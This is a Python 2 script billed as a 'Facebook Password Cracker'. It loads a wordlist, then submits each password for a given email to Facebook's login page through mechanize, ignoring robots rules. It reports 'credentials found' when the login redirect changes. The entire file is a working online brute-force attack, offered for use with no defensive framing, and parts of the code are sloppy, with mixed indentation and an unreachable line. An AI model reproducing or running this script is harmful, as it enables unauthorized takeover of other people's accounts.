import socket
import os
import time
import fontstyles
import cookielib
from time import strftime
from time import *
import time
import random
import argparse
try:
	import mechanize
except ImportError:
	print "{-} Please install the mechanize module. pip2 install mechanize"
tested = []
def banner():
    print ("""

___________________
|      NSK B3's    |
|Facebook Password |
|     Cracker      |
|------------------|
|                  |
|__________________|
""")
def args():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--user', help="Username")
    parser.add_argument('-P', '--passlist', help="Wordlist to use")
    args = parser.parse_args()
def clear():
    os.system('clear')
def fbrt():
        global args
	br = mechanize.Browser()
	useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	email = args.user
	br.addheaders = [('User-agent', random.choice(useragents))]
	cj = cookielib.LWPCookieJar()
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj)
	passlist = args.passlist
	try:
       	   passlist = open(passlist, "r").readlines()
	except:
	   clear()
	   print "Wordlist not found!"
	   quit()
	url = "https://www.facebook.com/login.php?login_attempt=1"
	br.open(url)

        print "[*] Passwords to try:",len(passlist)
	print "[*] Attack Started at: " + strftime ("%a, %d %b %Y %H:%M:%S", gmtime())
	time.sleep(0.5)
	for password in passlist:
	    br.select_form(nr=0)
	    br.form['email'] = email
	    br.form['pass'] = password.strip()
	    r = br.submit()
	    if (r != url) and (not 'login_attempt' in r.geturl()):
	    	clear()
                print fontstyles.font.green
		print "[+] CREDENTICALS FOUND: " + "\nPassword: " +  password.strip() + "\ne-mail: " + email
		print "Thanks for using my tool!"
		break
                print fontstyles.font.reset_all
	    else:
	    	tested.append(password)
		print fontstyles.messages.error,"Password Tested:",password, "Total Passwords Tested:",len(tested)
banner()
args()
fbrt()

